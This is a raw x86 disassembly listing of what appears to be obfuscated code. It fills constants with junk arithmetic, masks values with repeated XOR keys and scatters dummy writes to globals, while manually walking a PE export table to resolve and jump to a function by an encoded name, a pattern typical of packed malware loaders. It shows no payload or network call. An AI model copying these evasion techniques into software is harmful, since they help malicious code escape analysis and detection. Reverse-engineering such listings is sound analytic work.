  42128c:	xor    edx,edx
  42128e:	div    ecx
  421290:	add    eax,0x454e
  421295:	mov    ecx,DWORD PTR [ebp-0xc]
  421298:	and    eax,ecx
  42129a:	xor    eax,0x5940
  42129f:	add    eax,DWORD PTR [ebp+0x8]
  4212a2:	mov    ecx,DWORD PTR [ebp-0x110]
  4212a8:	mov    edx,DWORD PTR [ebp-0xa4]
  4212ae:	sub    ecx,edx
  4212b0:	mov    edx,DWORD PTR [ebp-0xd4]
  4212b6:	or     ecx,edx
  4212b8:	mov    edx,DWORD PTR [ebp-0x8]
  4212bb:	and    ecx,edx
  4212bd:	mov    edx,DWORD PTR [ebp-0x20]
  4212c0:	xor    ecx,edx
  4212c2:	mov    edx,DWORD PTR [ebp-0x10c]
  4212c8:	mov    esi,0x180f
  4212cd:	sub    esi,edx
  4212cf:	mov    edx,DWORD PTR [ebp-0xa0]
  4212d5:	imul   esi,edx
  4212d8:	xor    esi,0x402b
  4212de:	xor    esi,0xfed78c17
  4212e4:	mov    edx,DWORD PTR [ebp-0xe8]
  4212ea:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  4212f1:	add    ecx,eax
  4212f3:	add    esi,ecx
  4212f5:	mov    DWORD PTR [ebp-0x38],esi
  4212f8:	mov    DWORD PTR [ebp-0x4],0x59a8
  4212ff:	mov    DWORD PTR [ebp-0x30],0x7021
  421306:	mov    DWORD PTR [ebp-0xf4],0x6210
  421310:	mov    DWORD PTR [ebp-0x58],0x73d5
  421317:	mov    DWORD PTR [ebp-0x124],0x1e7d
  421321:	mov    DWORD PTR [ebp-0x3c],0x3144
  421328:	mov    eax,DWORD PTR [ebp-0x30]
  42132b:	xor    eax,0x75cb
  421330:	mov    ecx,DWORD PTR [ebp-0x4]
  421333:	imul   eax,ecx
  421336:	mov    ecx,DWORD PTR [ebp+0x8]
  421339:	lea    ecx,[ecx+eax*1-0x2123b90]
  421340:	mov    eax,DWORD PTR [ebp-0xf4]
  421346:	and    eax,0x6b34
  42134b:	and    eax,0x658d
  421350:	xor    edx,edx
  421352:	push   0x6
  421354:	pop    esi
  421355:	div    esi
  421357:	imul   eax,eax,0x3fb9
  42135d:	mov    edx,DWORD PTR [ebp-0x3c]
  421360:	and    edx,0x58c7
  421366:	mov    esi,DWORD PTR [ebp-0x124]
  42136c:	or     edx,esi
  42136e:	add    edx,0x7a25
  421374:	imul   edx,edx,0x28d2
  42137a:	mov    esi,DWORD PTR [ebp-0x58]
  42137d:	xor    edx,esi
  42137f:	xor    edx,0x1856f731
  421385:	mov    esi,DWORD PTR [ebp-0xe8]
  42138b:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  421392:	add    eax,ecx
  421394:	add    edx,eax
  421396:	mov    DWORD PTR [ebp-0xac],edx
  42139c:	mov    DWORD PTR [ebp-0x54],0x1
  4213a3:	mov    DWORD PTR [ebp-0x40],0x1ee8
  4213aa:	mov    DWORD PTR [ebp-0x1c],0x64d8
  4213b1:	mov    DWORD PTR [ebp-0xf0],0x5a06
  4213bb:	mov    DWORD PTR [ebp-0x108],0x2eeb
  4213c5:	mov    DWORD PTR [ebp-0x104],0x2108
  4213cf:	mov    eax,DWORD PTR [ebp-0x1c]
  4213d2:	xor    edx,edx
  4213d4:	push   0x3
  4213d6:	pop    ecx
  4213d7:	div    ecx
  4213d9:	mov    ecx,DWORD PTR [ebp-0x40]
  4213dc:	or     eax,ecx
  4213de:	mov    ecx,DWORD PTR [ebp-0x54]
  4213e1:	xor    edx,edx
  4213e3:	div    ecx
  4213e5:	imul   eax,eax,0x7d53
  4213eb:	mov    ecx,DWORD PTR [ebp+0x8]
  4213ee:	lea    eax,[ecx+eax*1-0x1f534807]
  4213f5:	mov    ecx,DWORD PTR [ebp-0xf0]
  4213fb:	and    ecx,0x4108
  421401:	and    ecx,0x40e7
  421407:	sub    ecx,0x1a54
  42140d:	xor    ecx,0x25ac
  421413:	mov    edx,DWORD PTR [ebp-0x104]
  421419:	xor    edx,0x6dda
  42141f:	mov    esi,DWORD PTR [ebp-0x108]
  421425:	and    edx,esi
  421427:	and    edx,0xe0c
  42142d:	or     edx,0x5b
  421430:	mov    esi,DWORD PTR [ebp-0xe8]
  421436:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  42143a:	add    ecx,eax
  42143c:	lea    eax,[edx+ecx*1-0xc5b]
  421443:	mov    DWORD PTR [ebp-0xa8],eax
  421449:	and    DWORD PTR [ebp-0x144],0x0
  421450:	jmp    0x421462
  421455:	mov    eax,DWORD PTR [ebp-0x144]
  42145b:	inc    eax
  42145c:	mov    DWORD PTR [ebp-0x144],eax
  421462:	mov    eax,DWORD PTR [ebp-0xe8]
  421468:	mov    ecx,DWORD PTR [ebp-0x144]
  42146e:	cmp    ecx,DWORD PTR [eax+0x18]
  421471:	je     0x421a2a
  421477:	mov    eax,DWORD PTR [ebp-0x144]
  42147d:	mov    ecx,DWORD PTR [ebp-0x38]
  421480:	mov    edx,DWORD PTR [ebp+0x8]
  421483:	add    edx,DWORD PTR [ecx+eax*4]
  421486:	mov    DWORD PTR [ebp-0x48],edx
  421489:	mov    eax,DWORD PTR [ebp-0x48]
  42148c:	mov    DWORD PTR [ebp-0x210],eax
  421492:	mov    eax,DWORD PTR [ebp+0xc]
  421495:	mov    DWORD PTR [ebp-0x20c],eax
  42149b:	mov    DWORD PTR [ebp-0x1f0],0xba699573
  4214a5:	mov    DWORD PTR [ebp-0x1ec],0x9c0a89d8
  4214af:	mov    DWORD PTR [ebp-0x1e0],0xba699577
  4214b9:	mov    DWORD PTR [ebp-0x1dc],0x9c0a89d8
  4214c3:	lea    eax,[ebp-0x1e8]
  4214c9:	mov    DWORD PTR [ebp-0x1f4],eax
  4214cf:	mov    eax,DWORD PTR [ebp-0x20c]
  4214d5:	movzx  eax,WORD PTR [eax+0x20]
  4214d9:	xor    eax,0xa38b
  4214de:	movzx  eax,ax
  4214e1:	sar    eax,1
  4214e3:	mov    ecx,DWORD PTR [ebp-0x20c]
  4214e9:	movzx  ecx,WORD PTR [ecx+0x20]
  4214ed:	xor    ecx,0xa38b
  4214f3:	movzx  ecx,cx
  4214f6:	shl    ecx,0xf
  4214f9:	or     eax,ecx
  4214fb:	movzx  eax,ax
  4214fe:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421504:	mov    DWORD PTR [ecx],eax
  421506:	mov    eax,DWORD PTR [ebp-0x1e0]
  42150c:	mov    edx,DWORD PTR [ebp-0x1dc]
  421512:	xor    eax,0xba699573
  421517:	xor    edx,0x9c0a89d8
  42151d:	mov    cl,0x2
  42151f:	call   0x41a184
  421524:	mov    ebx,eax
  421526:	mov    esi,edx
  421528:	mov    eax,DWORD PTR [ebp-0x1e0]
  42152e:	mov    edx,DWORD PTR [ebp-0x1dc]
  421534:	xor    eax,0xba699573
  421539:	xor    edx,0x9c0a89d8
  42153f:	mov    cl,0x3e
  421541:	call   0x421c3a
  421546:	or     ebx,eax
  421548:	or     esi,edx
  42154a:	movzx  eax,bl
  42154d:	push   eax
  42154e:	lea    eax,[ebp-0x198]
  421554:	push   eax
  421555:	call   0x41e081
  42155a:	mov    eax,DWORD PTR [ebp-0x1f0]
  421560:	mov    edx,DWORD PTR [ebp-0x1ec]
  421566:	xor    eax,0xba699573
  42156b:	xor    edx,0x9c0a89d8
  421571:	mov    cl,0x2
  421573:	call   0x41a184
  421578:	mov    esi,eax
  42157a:	mov    edi,edx
  42157c:	mov    eax,DWORD PTR [ebp-0x1f0]
  421582:	mov    edx,DWORD PTR [ebp-0x1ec]
  421588:	xor    eax,0xba699573
  42158d:	xor    edx,0x9c0a89d8
  421593:	mov    cl,0x3e
  421595:	call   0x421c3a
  42159a:	or     esi,eax
  42159c:	or     edi,edx
  42159e:	mov    DWORD PTR [ebp-0x1f8],esi
  4215a4:	jmp    0x4215f9
  4215a9:	mov    eax,DWORD PTR [ebp-0x1e0]
  4215af:	mov    edx,DWORD PTR [ebp-0x1dc]
  4215b5:	xor    eax,0xba699573
  4215ba:	xor    edx,0x9c0a89d8
  4215c0:	mov    cl,0x2
  4215c2:	call   0x41a184
  4215c7:	mov    esi,eax
  4215c9:	mov    edi,edx
  4215cb:	mov    eax,DWORD PTR [ebp-0x1e0]
  4215d1:	mov    edx,DWORD PTR [ebp-0x1dc]
  4215d7:	xor    eax,0xba699573
  4215dc:	xor    edx,0x9c0a89d8
  4215e2:	mov    cl,0x3e
  4215e4:	call   0x421c3a
  4215e9:	or     esi,eax
  4215eb:	or     edi,edx
  4215ed:	add    esi,DWORD PTR [ebp-0x1f8]
  4215f3:	mov    DWORD PTR [ebp-0x1f8],esi
  4215f9:	mov    eax,DWORD PTR [ebp-0x1e8]
  4215ff:	cmp    DWORD PTR [ebp-0x1f8],eax
  421605:	je     0x421698
  42160b:	mov    eax,DWORD PTR [ebp-0x1f8]
  421611:	mov    ecx,DWORD PTR [ebp-0x20c]
  421617:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  42161c:	xor    eax,0xa38b
  421621:	movzx  eax,ax
  421624:	sar    eax,1
  421626:	mov    ecx,DWORD PTR [ebp-0x1f8]
  42162c:	mov    edx,DWORD PTR [ebp-0x20c]
  421632:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421637:	xor    ecx,0xa38b
  42163d:	movzx  ecx,cx
  421640:	shl    ecx,0xf
  421643:	or     eax,ecx
  421645:	movzx  eax,ax
  421648:	mov    DWORD PTR [ebp-0x1fc],eax
  42164e:	mov    eax,DWORD PTR [ebp-0x1f8]
  421654:	mov    ecx,DWORD PTR [ebp-0x20c]
  42165a:	movzx  eax,WORD PTR [ecx+eax*4]
  42165e:	xor    eax,0xa38b
  421663:	movzx  eax,ax
  421666:	sar    eax,1
  421668:	mov    ecx,DWORD PTR [ebp-0x1f8]
  42166e:	mov    edx,DWORD PTR [ebp-0x20c]
  421674:	movzx  ecx,WORD PTR [edx+ecx*4]
  421678:	xor    ecx,0xa38b
  42167e:	movzx  ecx,cx
  421681:	shl    ecx,0xf
  421684:	or     eax,ecx
  421686:	mov    ecx,DWORD PTR [ebp-0x1fc]
  42168c:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421693:	jmp    0x4215a9
  421698:	mov    eax,DWORD PTR [ebp-0x1f0]
  42169e:	mov    edx,DWORD PTR [ebp-0x1ec]
  4216a4:	xor    eax,0xba699573
  4216a9:	xor    edx,0x9c0a89d8
  4216af:	mov    cl,0x2
  4216b1:	call   0x41a184
  4216b6:	mov    esi,eax
  4216b8:	mov    edi,edx
  4216ba:	mov    eax,DWORD PTR [ebp-0x1f0]
  4216c0:	mov    edx,DWORD PTR [ebp-0x1ec]
  4216c6:	xor    eax,0xba699573
  4216cb:	xor    edx,0x9c0a89d8
  4216d1:	mov    cl,0x3e
  4216d3:	call   0x421c3a
  4216d8:	or     esi,eax
  4216da:	or     edi,edx
  4216dc:	mov    DWORD PTR [ebp-0x1e4],esi
  4216e2:	mov    eax,DWORD PTR [ebp-0x1e0]
  4216e8:	mov    edx,DWORD PTR [ebp-0x1dc]
  4216ee:	xor    eax,0xba699573
  4216f3:	xor    edx,0x9c0a89d8
  4216f9:	mov    cl,0x2
  4216fb:	call   0x41a184
  421700:	mov    esi,eax
  421702:	mov    edi,edx
  421704:	mov    eax,DWORD PTR [ebp-0x1e0]
  42170a:	mov    edx,DWORD PTR [ebp-0x1dc]
  421710:	xor    eax,0xba699573
  421715:	xor    edx,0x9c0a89d8
  42171b:	mov    cl,0x3e
  42171d:	call   0x421c3a
  421722:	or     esi,eax
  421724:	or     edi,edx
  421726:	mov    DWORD PTR [ebp-0x23c],esi
  42172c:	mov    DWORD PTR [ebp-0x238],edi
  421732:	mov    eax,DWORD PTR [ebp-0x23c]
  421738:	or     eax,DWORD PTR [ebp-0x238]
  42173e:	je     0x42199e
  421744:	lea    eax,[ebp-0x204]
  42174a:	mov    DWORD PTR [ebp-0x208],eax
  421750:	mov    eax,DWORD PTR [ebp-0x1e4]
  421756:	xor    edx,edx
  421758:	mov    cl,0x2
  42175a:	call   0x421c3a
  42175f:	mov    esi,eax
  421761:	mov    edi,edx
  421763:	mov    eax,DWORD PTR [ebp-0x1e4]
  421769:	xor    edx,edx
  42176b:	mov    cl,0x3e
  42176d:	call   0x41a184
  421772:	or     esi,eax
  421774:	or     edi,edx
  421776:	xor    esi,0xba699573
  42177c:	xor    edi,0x9c0a89d8
  421782:	mov    eax,DWORD PTR [ebp-0x208]
  421788:	mov    DWORD PTR [eax],esi
  42178a:	mov    DWORD PTR [eax+0x4],edi
  42178d:	mov    eax,DWORD PTR [ebp-0x1e4]
  421793:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  42179b:	mov    eax,DWORD PTR [ebp-0x1e0]
  4217a1:	mov    edx,DWORD PTR [ebp-0x1dc]
  4217a7:	xor    eax,0xba699573
  4217ac:	xor    edx,0x9c0a89d8
  4217b2:	mov    cl,0x2
  4217b4:	call   0x41a184
  4217b9:	mov    ebx,eax
  4217bb:	mov    edi,edx
  4217bd:	mov    eax,DWORD PTR [ebp-0x1e0]
  4217c3:	mov    edx,DWORD PTR [ebp-0x1dc]
  4217c9:	xor    eax,0xba699573
  4217ce:	xor    edx,0x9c0a89d8
  4217d4:	mov    cl,0x3e
  4217d6:	call   0x421c3a
  4217db:	or     ebx,eax
  4217dd:	or     edi,edx
  4217df:	movsx  eax,bl
  4217e2:	cmp    esi,eax
  4217e4:	je     0x421944
  4217ea:	mov    eax,DWORD PTR [ebp-0x1e4]
  4217f0:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  4217f8:	mov    eax,DWORD PTR [ebp-0x204]
  4217fe:	mov    edx,DWORD PTR [ebp-0x200]
  421804:	xor    eax,0xba699573
  421809:	xor    edx,0x9c0a89d8
  42180f:	mov    cl,0x2
  421811:	call   0x41a184
  421816:	mov    edi,eax
  421818:	mov    ebx,edx
  42181a:	mov    eax,DWORD PTR [ebp-0x204]
  421820:	mov    edx,DWORD PTR [ebp-0x200]
  421826:	xor    eax,0xba699573
  42182b:	xor    edx,0x9c0a89d8
  421831:	mov    cl,0x3e
  421833:	call   0x421c3a
  421838:	or     edi,eax
  42183a:	or     ebx,edx
  42183c:	mov    eax,DWORD PTR [ebp-0x210]
  421842:	movsx  eax,BYTE PTR [eax+edi*1]
  421846:	cmp    esi,eax
  421848:	je     0x421858
  42184e:	jmp    0x42199e
  421853:	jmp    0x421944
  421858:	mov    eax,DWORD PTR [ebp-0x204]
  42185e:	mov    edx,DWORD PTR [ebp-0x200]
  421864:	xor    eax,0xba699573
  421869:	xor    edx,0x9c0a89d8
  42186f:	mov    cl,0x2
  421871:	call   0x41a184
  421876:	mov    esi,eax
  421878:	mov    edi,edx
  42187a:	mov    eax,DWORD PTR [ebp-0x204]
  421880:	mov    edx,DWORD PTR [ebp-0x200]
  421886:	xor    eax,0xba699573
  42188b:	xor    edx,0x9c0a89d8
  421891:	mov    cl,0x3e
  421893:	call   0x421c3a
  421898:	or     esi,eax
  42189a:	or     edi,edx
  42189c:	mov    eax,DWORD PTR [ebp-0x210]
  4218a2:	movsx  esi,BYTE PTR [eax+esi*1]
  4218a6:	mov    eax,DWORD PTR [ebp-0x1f0]
  4218ac:	mov    edx,DWORD PTR [ebp-0x1ec]
  4218b2:	xor    eax,0xba699573
  4218b7:	xor    edx,0x9c0a89d8
  4218bd:	mov    cl,0x2
  4218bf:	call   0x41a184
  4218c4:	mov    ebx,eax
  4218c6:	mov    edi,edx
  4218c8:	mov    eax,DWORD PTR [ebp-0x1f0]
  4218ce:	mov    edx,DWORD PTR [ebp-0x1ec]
  4218d4:	xor    eax,0xba699573
  4218d9:	xor    edx,0x9c0a89d8
  4218df:	mov    cl,0x3e
  4218e1:	call   0x421c3a
  4218e6:	or     ebx,eax
  4218e8:	or     edi,edx
  4218ea:	movsx  eax,bl
  4218ed:	cmp    esi,eax
  4218ef:	jne    0x421944
  4218f5:	mov    eax,DWORD PTR [ebp-0x1e0]
  4218fb:	mov    edx,DWORD PTR [ebp-0x1dc]
  421901:	xor    eax,0xba699573
  421906:	xor    edx,0x9c0a89d8
  42190c:	mov    cl,0x2
  42190e:	call   0x41a184
  421913:	mov    esi,eax
  421915:	mov    edi,edx
  421917:	mov    eax,DWORD PTR [ebp-0x1e0]
  42191d:	mov    edx,DWORD PTR [ebp-0x1dc]
  421923:	xor    eax,0xba699573
  421928:	xor    edx,0x9c0a89d8
  42192e:	mov    cl,0x3e
  421930:	call   0x421c3a
  421935:	or     esi,eax
  421937:	or     edi,edx
  421939:	mov    DWORD PTR [ebp-0x214],esi
  42193f:	jmp    0x4219e8
  421944:	mov    eax,DWORD PTR [ebp-0x1e0]
  42194a:	mov    edx,DWORD PTR [ebp-0x1dc]
  421950:	xor    eax,0xba699573
  421955:	xor    edx,0x9c0a89d8
  42195b:	mov    cl,0x2
  42195d:	call   0x41a184
  421962:	mov    esi,eax
  421964:	mov    edi,edx
  421966:	mov    eax,DWORD PTR [ebp-0x1e0]
  42196c:	mov    edx,DWORD PTR [ebp-0x1dc]
  421972:	xor    eax,0xba699573
  421977:	xor    edx,0x9c0a89d8
  42197d:	mov    cl,0x3e
  42197f:	call   0x421c3a
  421984:	or     esi,eax
  421986:	or     edi,edx
  421988:	add    esi,DWORD PTR [ebp-0x1e4]
  42198e:	mov    DWORD PTR [ebp-0x1e4],esi
  421994:	jmp    0x4216e2
  421999:	jmp    0x4216e2
  42199e:	mov    eax,DWORD PTR [ebp-0x1f0]
  4219a4:	mov    edx,DWORD PTR [ebp-0x1ec]
  4219aa:	xor    eax,0xba699573
  4219af:	xor    edx,0x9c0a89d8
  4219b5:	mov    cl,0x2
  4219b7:	call   0x41a184
  4219bc:	mov    esi,eax
  4219be:	mov    edi,edx
  4219c0:	mov    eax,DWORD PTR [ebp-0x1f0]
  4219c6:	mov    edx,DWORD PTR [ebp-0x1ec]
  4219cc:	xor    eax,0xba699573
  4219d1:	xor    edx,0x9c0a89d8
  4219d7:	mov    cl,0x3e
  4219d9:	call   0x421c3a
  4219de:	or     esi,eax
  4219e0:	or     edi,edx
  4219e2:	mov    DWORD PTR [ebp-0x214],esi
  4219e8:	mov    eax,DWORD PTR [ebp-0x214]
  4219ee:	mov    DWORD PTR [ebp-0xc8],eax
  4219f4:	cmp    DWORD PTR [ebp-0xc8],0x0
  4219fb:	je     0x421a25
  421a01:	mov    eax,DWORD PTR [ebp-0x144]
  421a07:	mov    ecx,DWORD PTR [ebp-0xac]
  421a0d:	movzx  eax,WORD PTR [ecx+eax*2]
  421a11:	mov    ecx,DWORD PTR [ebp-0xa8]
  421a17:	mov    eax,DWORD PTR [ecx+eax*4]
  421a1a:	mov    DWORD PTR [ebp-0xfc],eax
  421a20:	jmp    0x421a2a
  421a25:	jmp    0x421455
  421a2a:	cmp    DWORD PTR [ebp-0xfc],0x0
  421a31:	jne    0x421a3e
  421a37:	xor    eax,eax
  421a39:	jmp    0x421c33
  421a3e:	mov    eax,DWORD PTR [ebp+0x8]
  421a41:	add    eax,DWORD PTR [ebp-0xfc]
  421a47:	mov    DWORD PTR [ebp-0xec],eax
  421a4d:	mov    DWORD PTR [ebp-0x74],0x0
  421a54:	cmp    DWORD PTR [ebp-0xb0],0x0
  421a5b:	je     0x421ad7
  421a61:	cmp    DWORD PTR [ebp-0xb0],0x0
  421a68:	je     0x421ad7
  421a6e:	mov    eax,DWORD PTR [ebp-0xb0]
  421a74:	shl    eax,0x2
  421a77:	mov    DWORD PTR [ebp-0x74],eax
  421a7a:	mov    DWORD PTR [ebp-0x14c],0x0
  421a84:	sub    esp,DWORD PTR [ebp-0x74]
  421a87:	mov    DWORD PTR [ebp-0x14c],esp
  421a8d:	mov    DWORD PTR [ebp-0x148],0x0
  421a97:	mov    eax,DWORD PTR [ebp-0x148]
  421a9d:	cmp    eax,DWORD PTR [ebp-0xb0]
  421aa3:	je     0x421ad7
  421aa9:	mov    eax,DWORD PTR [ebp-0x148]
  421aaf:	mov    ecx,DWORD PTR [ebp-0x14c]
  421ab5:	mov    edx,DWORD PTR [ebp-0x148]
  421abb:	mov    esi,DWORD PTR [ebp+0x14]
  421abe:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  421ac2:	mov    DWORD PTR [ecx+eax*4],edx
  421ac5:	mov    eax,DWORD PTR [ebp-0x148]
  421acb:	inc    eax
  421acc:	mov    DWORD PTR [ebp-0x148],eax
  421ad2:	jmp    0x421a97
  421ad7:	mov    DWORD PTR [ebp-0x9c],0x0
  421ae1:	push   0x421bfa
  421ae6:	jmp    DWORD PTR [ebp-0xec]
  421aec:	mov    eax,eax
  421aee:	mov    ecx,esp
  421af0:	ret    0x4
  421af3:	sub    DWORD PTR ds:0x422972,ecx
  421af9:	push   ebx
  421afa:	mov    eax,ds:0x422a36
  421aff:	mov    eax,DWORD PTR [eax]
  421b01:	add    DWORD PTR ds:0x4228be,eax
  421b07:	push   esi
  421b08:	inc    eax
  421b09:	mov    eax,DWORD PTR [esp+0x18]
  421b0d:	or     eax,eax
  421b0f:	mov    DWORD PTR ds:0x422976,0x30f6
  421b19:	jne    0x421b6a
  421b1f:	mov    ecx,DWORD PTR [esp+0x14]
  421b23:	xor    DWORD PTR ds:0x4228f6,0x4645
  421b2d:	mov    eax,DWORD PTR [esp+0x10]
  421b31:	mov    ebx,DWORD PTR ds:0x422992
  421b37:	add    ebx,DWORD PTR ds:0x42299e
  421b3d:	mov    DWORD PTR ds:0x422992,ebx
  421b43:	xor    edx,edx
  421b45:	adc    DWORD PTR ds:0x422972,0x7727
  421b4f:	div    ecx
  421b51:	mov    ebx,eax
  421b53:	mov    eax,DWORD PTR [esp+0xc]
  421b57:	mov    DWORD PTR ds:0x4228aa,0xac4
  421b61:	div    ecx
  421b63:	mov    edx,ebx
  421b65:	jmp    0x421bf5
  421b6a:	mov    ecx,eax
  421b6c:	movzx  eax,WORD PTR ds:0x4228ca
  421b73:	or     eax,DWORD PTR ds:0x4229b2
  421b79:	mov    ds:0x4228ca,eax
  421b7e:	mov    ebx,DWORD PTR [esp+0x14]
  421b82:	adc    DWORD PTR ds:0x422922,ecx
  421b88:	mov    edx,DWORD PTR [esp+0x10]
  421b8c:	mov    eax,DWORD PTR [esp+0xc]
  421b90:	sbb    DWORD PTR ds:0x42299a,0x1a98
  421b9a:	shr    ecx,1
  421b9c:	mov    DWORD PTR ds:0x42289e,0x38b9
  421ba6:	rcr    ebx,1
  421ba8:	or     DWORD PTR ds:0x42296e,0x13a0
  421bb2:	shr    edx,1
  421bb4:	rcr    eax,1
  421bb6:	or     ecx,ecx
  421bb8:	jne    0x421b90
  421bbe:	div    ebx
  421bc0:	mov    esi,eax
  421bc2:	mul    DWORD PTR [esp+0x18]
  421bc6:	mov    ecx,eax
  421bc8:	mov    eax,DWORD PTR [esp+0x14]
  421bcc:	mul    esi
  421bce:	add    edx,ecx
  421bd0:	jb     0x421bf0
  421bd6:	cmp    edx,DWORD PTR [esp+0x10]
  421bda:	ja     0x421bf0
  421be0:	jb     0x421bf1
  421be6:	cmp    eax,DWORD PTR [esp+0xc]
  421bea:	jbe    0x421bf1
  421bf0:	dec    esi
  421bf1:	xor    edx,edx
  421bf3:	mov    eax,esi
  421bf5:	pop    esi
  421bf6:	pop    ebx
  421bf7:	ret    0x10
  421bfa:	sub    DWORD PTR [ebp+0x10],0x1
  421bfe:	mov    DWORD PTR ds:0x4228ce,0x220d
  421c08:	cmp    DWORD PTR [ebp+0x10],0x0
  421c0c:	je     0x421c1b
  421c12:	and    edi,DWORD PTR ds:0x4229ca
  421c18:	add    esp,DWORD PTR [ebp-0x74]
  421c1b:	mov    edi,DWORD PTR ds:0x422896
  421c21:	mov    DWORD PTR [ebp-0x9c],eax
  421c27:	mov    eax,DWORD PTR [ebp-0x9c]
  421c2d:	mov    DWORD PTR ds:0x4228ee,edx
  421c33:	pop    edi
  421c34:	pop    esi
  421c35:	pop    ebx
  421c36:	leave  
  421c37:	ret    0x10
  421c3a:	mov    DWORD PTR ds:0x42298e,0x1d18
  421c44:	cmp    cl,0x40
  421c47:	jae    0x421c8e
  421c4d:	cmp    cl,0x20
  421c50:	mov    DWORD PTR ds:0x4228d6,0x5a1c
  421c5a:	jae    0x421c66
  421c60:	shld   edx,eax,cl
  421c63:	shl    eax,cl
  421c65:	ret    
  421c66:	and    DWORD PTR ds:0x42293e,0x7607
  421c70:	mov    edx,eax
  421c72:	sub    DWORD PTR ds:0x4228fa,0x422952
  421c7c:	xor    eax,eax
  421c7e:	and    cl,0x1f
  421c81:	mov    DWORD PTR ds:0x42295e,0x73ce
  421c8b:	shl    edx,cl
  421c8d:	ret    
  421c8e:	xor    eax,eax
  421c90:	xor    edx,edx
  421c92:	ret    
